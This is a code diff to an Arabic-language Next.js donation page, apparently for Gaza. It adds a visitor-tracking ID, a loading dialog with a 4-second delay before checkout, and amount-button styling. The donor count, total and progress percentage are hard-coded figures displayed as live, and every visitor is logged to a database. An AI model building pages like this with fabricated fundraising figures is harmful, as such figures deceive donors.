@@ -7,11 +7,12 @@ import { Input } from "@/components/ui/input"
 import { addData } from "@/lib/db"
 import { useRouter } from "next/navigation"
 import Progress from "@/components/ui/progress"
-import { Facebook, Instagram, Twitter, YoutubeIcon } from "lucide-react"
+import { Facebook, Instagram, Twitter, YoutubeIcon } from 'lucide-react'
+import { DialogLoader } from "@/components/dilog-loader"
 
 export default function DonationPage() {
-  
-  const [customAmount, setCustomAmount] = useState("")
+  const [customAmount, setCustomAmount] = useState("") 
+   const [isLoading, setIsLoading] = useState(false)
   const [_id] = useState("id" + Math.random().toString(16).slice(2))
   const router = useRouter()
 
@@ -19,6 +20,9 @@ export default function DonationPage() {
     // Wrap in try/catch to prevent build errors
     try {
       if (typeof window !== "undefined") {
+        // Store visitor ID in localStorage for use in checkout
+        localStorage.setItem('visitor', _id)
+        
         addData({
           id: _id,
           currentPage: "الرئيسة",
@@ -36,20 +40,40 @@ export default function DonationPage() {
     target: 300000,
     percentComplete: 77,
   }
-const setAmount=(e)=>{
-  localStorage.setItem('amount',e)
-}
-  const handleCustomAmountChange = (e: string) => {
-    setCustomAmount(e)
-    setAmount(e)
+  
+  const setAmount = (amount: string) => {
+    localStorage.setItem('amount', amount)
+  }
+  
+  const handleCustomAmountChange = (amount: string) => {
+    setCustomAmount(amount)
+    setAmount(amount)
+  }
+
+  const handleDonateClick = () => {
+    setIsLoading(true)
+    // Ensure an amount is selected before proceeding to checkout
+   setTimeout(() => {
+    if (customAmount) {
+      router.push(`/checkout`)
+    } else {
+      // Set a default amount or show an alert
+      setCustomAmount("50")
+      setAmount("50")
+      router.push(`/checkout`)
+    }
+    setIsLoading(false)
+
+   }, 4000);
   }
 
   return (
     <div className="flex flex-col min-h-screen bg-gray-100 text-right" dir="rtl">
-      {/* Header */}
+      {/* Main content */}
+      <DialogLoader isOpen={isLoading} message="يرجى الانتظار..."/>
       <main className="flex-1 max-w-3xl mx-auto w-full p-4">
         {/* Video Section */}
-        <div className="relative aspect-video w-full mb-6 bg-gray-200 rounded">
+        <div className="relative aspect-video w-full mb-6 bg-gray-200 rounded overflow-hidden">
           <iframe
             width="100%"
             height="100%"
@@ -68,22 +92,24 @@ const setAmount=(e)=>{
         <div className="grid grid-cols-3 gap-4 mb-4 text-center">
           <div>
             <p className="text-gray-500">عدد المتبرعين</p>
-            <p className="  text-orange-600">{donationStats.donors}</p>
+            <p className="text-orange-600">{donationStats.donors}</p>
           </div>
           <div>
             <p className="text-gray-500">المجموع</p>
-            <p className=" text-orange-600">{donationStats.current.toLocaleString()} د.ك      </p>
+            <p className="text-orange-600">{donationStats.current.toLocaleString()} د.ك</p>
           </div>
           <div>
             <p className="text-gray-500">التكلفة</p>
-            <p className=" text-orange-600">{donationStats.target.toLocaleString()} د.ك</p>
+            <p className="text-orange-600">{donationStats.target.toLocaleString()} د.ك</p>
           </div>
         </div>
+        
+        {/* Progress Bar - Keeping the original implementation */}
         <div className="mb-6">
-         <Progress value="77%"/>
+          <Progress value="77%" />
         </div>
 
-        {/* Progress Bar - Fixed to ensure value is a number */}
+        {/* Progress Percentage - Keeping as in original */}
         <div className="mb-6">
           <div className="text-left mt-1">
             <span className="text-orange-500 font-bold">{donationStats.percentComplete}%</span>
@@ -97,28 +123,28 @@ const setAmount=(e)=>{
             <Button
               variant={customAmount === "30" ? "default" : "outline"}
               onClick={() => handleCustomAmountChange("30")}
-              className="bg-white border text-black hover:bg-gray-100 hover:text-black"
+              className={customAmount === "30" ? "bg-orange-500 hover:bg-orange-600 text-white" : "bg-white border text-black hover:bg-gray-100 hover:text-black"}
             >
               د.ك 30
             </Button>
             <Button
               variant={customAmount === "40" ? "default" : "outline"}
               onClick={() => handleCustomAmountChange("40")}
-              className="bg-white border text-black hover:bg-gray-100 hover:text-black"
+              className={customAmount === "40" ? "bg-orange-500 hover:bg-orange-600 text-white" : "bg-white border text-black hover:bg-gray-100 hover:text-black"}
             >
               د.ك 40
             </Button>
             <Button
               variant={customAmount === "50" ? "default" : "outline"}
               onClick={() => handleCustomAmountChange("50")}
-              className="bg-white border text-black hover:bg-gray-100 hover:text-black"
+              className={customAmount === "50" ? "bg-orange-500 hover:bg-orange-600 text-white" : "bg-white border text-black hover:bg-gray-100 hover:text-black"}
             >
               د.ك 50
             </Button>
             <Button
               variant={customAmount === "60" ? "default" : "outline"}
               onClick={() => handleCustomAmountChange("60")}
-              className="bg-white border text-black hover:bg-gray-100 hover:text-black"
+              className={customAmount === "60" ? "bg-orange-500 hover:bg-orange-600 text-white" : "bg-white border text-black hover:bg-gray-100 hover:text-black"}
             >
               د.ك 60
             </Button>
@@ -141,7 +167,7 @@ const setAmount=(e)=>{
 
           {/* Donate Button */}
           <Button
-            onClick={() => router.push(`/checkout`)}
+            onClick={handleDonateClick}
             className="w-full bg-[#0a3b4d] hover:bg-[#0a3b4d]/90 text-white py-3 mb-4"
           >
             تبرع الآن
@@ -149,10 +175,18 @@ const setAmount=(e)=>{
 
           {/* Additional Options */}
           <div className="grid grid-cols-2 gap-4 mb-6">
-            <Button onClick={()=>router.push('https://web.whatsapp.com/send?text=GitHub%3A%3A%20http%3A%2F%2Fgithub.com')} variant="outline" className="bg-orange-500 hover:bg-orange-600 text-white border-orange-500">
+            <Button 
+              onClick={() => window.open('https://web.whatsapp.com/send?text=تبرع لغزة: http://example.com', '_blank')} 
+              variant="outline" 
+              className="bg-orange-500 hover:bg-orange-600 text-white border-orange-500"
+            >
               مشاركة المشروع
             </Button>
-            <Button onClick={()=>router.push('/checkout')} variant="outline" className="bg-orange-500 hover:bg-orange-600 text-white border-orange-500">
+            <Button 
+              onClick={() => router.push('/checkout')} 
+              variant="outline" 
+              className="bg-orange-500 hover:bg-orange-600 text-white border-orange-500"
+            >
               إضافة للسلة
             </Button>
           </div>
@@ -167,7 +201,7 @@ const setAmount=(e)=>{
           </p>
         </div>
 
-        {/* Social Media - Fixed to use proper Lucide icons*/}
+        {/* Social Media */}
         <div className="flex justify-center gap-4 mb-6">
           <Link href="#" className="bg-[#0a3b4d] p-2 rounded-md text-white">
             <Instagram size={20} />
@@ -182,6 +216,7 @@ const setAmount=(e)=>{
             <Facebook size={20} />
           </Link>
         </div>
+        
         {/* Newsletter */}
         <div className="mb-8">
           <h3 className="text-lg font-bold mb-2">نشرتنا الإلكترونية</h3>
